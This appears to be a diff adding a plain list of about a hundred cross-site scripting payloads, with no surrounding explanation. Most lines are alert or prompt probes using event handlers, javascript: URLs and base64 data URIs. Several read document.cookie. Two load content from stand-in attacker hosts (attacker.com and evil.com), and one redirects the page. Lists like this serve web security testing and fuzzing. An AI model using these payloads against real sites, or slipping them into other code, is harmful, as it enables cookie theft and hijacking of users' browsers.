@@ -1,0 +1,97 @@
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<input type=text onfocus=alert(1) autofocus>
+<body onload=alert(1)>
+<a href=javascript:alert(1)>Click</a>
+<marquee onstart=alert(1)></marquee>
+<details open ontoggle=alert(1)></details>
+<object data="javascript:alert(1)"></object>
+<embed src="javascript:alert(1)">
+<video src=1 onerror=alert(1)>
+<audio src=1 onerror=alert(1)>
+<isindex type=image src=1 onerror=alert(1)>
+<form action="javascript:alert(1)">
+<meta http-equiv="refresh" content="0; url=javascript:alert(1)">
+<link rel="stylesheet" href="javascript:alert(1)">
+<table background="javascript:alert(1)">
+<div onmouseover=alert(1)>Hover me</div>
+<p onclick=alert(1)>Click me</p>
+<button onmouseover=alert(1)>Hover</button>
+<bdo dir="rtl" onmouseover=alert(1)>XSS</bdo>
+<span onmousemove=alert(1)>Move mouse</span>
+<textarea onfocus=alert(1) autofocus></textarea>
+<frame src="javascript:alert(1)">
+<frameset onload=alert(1)>
+<style>@import "javascript:alert(1)";</style>
+<style>body{background:url(javascript:alert(1))}</style>
+<link rel="stylesheet" href="data:text/css,@import'javascript:alert(1)';">
+<input type="button" value="Click" onclick="alert(1)">
+<script>alert(document.cookie)</script>
+<img src="1" onerror="prompt(1)">
+<svg><script>alert(1)</script></svg>
+<object type="text/x-scriptlet" data="http://attacker.com/xss.html"></object>
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<video poster=1 onerror=alert(1)>
+<math href="javascript:alert(1)">Click me</math>
+<var onmouseover="alert(1)">Hover</var>
+<h1 onmouseover="alert(1)">Hover</h1>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<plaintext onmousemove=alert(1)>
+<marquee onstart=alert(1)>XSS</marquee>
+<svg onload=document.location.href="https://google.com">
+<audio src=x onerror=confirm("1")>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<img src="x:? title=" onerror=alert(1)//">
+<script>$=1,alert($)</script>
+<svg•onload=alert(1)>
+<h1 onmouseover="alert(1)">XSS</h1>
+<video onerror=alert(1337)></poster>
+<input onfocus=alert(1337) autofocus>
+<svg onload=eval(location.hash.substr(1))>#alert(1)
+<details/open/ontoggle=confirm("XSS")>
+<button onmousemove="javascript:alert(1)">XSS</button>
+<body onpageshow=prompt(1)>
+<a href=[0x0b]xss" onfocus=prompt(1) autofocus>
+<img/src=q onerror="new Function`alert(1)`">
+<Html Onmouseover="alert(1)">
+<a href="javascript:alert(document.domain)">Click</a>
+<script/src=//google.com/complete/search?client=chrome&jsonp=alert(1);>
+<iframe srcdoc="<img src=x onerror=alert(1)>">
+<keygen autofocus onfocus=alert(1)>
+<div onmouseover=alert(1)>XSS</div>
+<a onmouseover="alert(1)">XSS</a>
+<isindex type=image src=1 onerror=alert(1)>
+<p/onmouseover=alert(1)>XSS</p>
+<span/onmouseover=alert(1)>XSS</span>
+<object allowscriptaccess=always><param name=code value="https://evil.com/xss.swf">
+<input type="text" name="foo" value="" autofocus onfocus=alert(1)>
+<svg x=">" onload=alert(1)>
+<video onerror=alert(1)>
+<math href="javascript:alert(1)">XSS</math>
+<var onmouseover="prompt(1)">XSS</var>
+<i onclick=alert(1)>Click</i>
+<svg onload=document.location.href="javascript:alert(1)">
+<iframe/name="javascript:alert(1);" onload="eval(name);">
+<object data="javascript:alert(1)">
+<script>alert("XSS")</script>
+<b onmouseover=alert(1)>XSS</b>
+<table onmouseover=alert(1)>
+<marquee onclick=alert(1)>XSS</marquee>
+<img onerror=alert(1) src="x">
+<script>alert(document.cookie)</script>
+<div onmouseover=prompt(1)>XSS</div>
+<img src="x:gif" onerror="alert('XSS')">
+<a href="javascript://%250Aalert(document.location)">Click</a>
+<img src="x" onerror="eval('alert(1)')">
+<svg onload=eval('alert(1)')>
+<iframe src="javascript:alert(document.cookie)">
+<style>@import "javascript:alert(1)";</style>
+<video poster=1 onerror=alert(1)>
+<svg/onload=alert(1)>
+<textarea onfocus=alert(1) autofocus></textarea>
+<frame src="javascript:alert(1)">
+<input onfocus=alert(1) autofocus>
+<isindex type=image src=1 onerror=alert(1)>
+<plaintext onmousemove=prompt(1)>
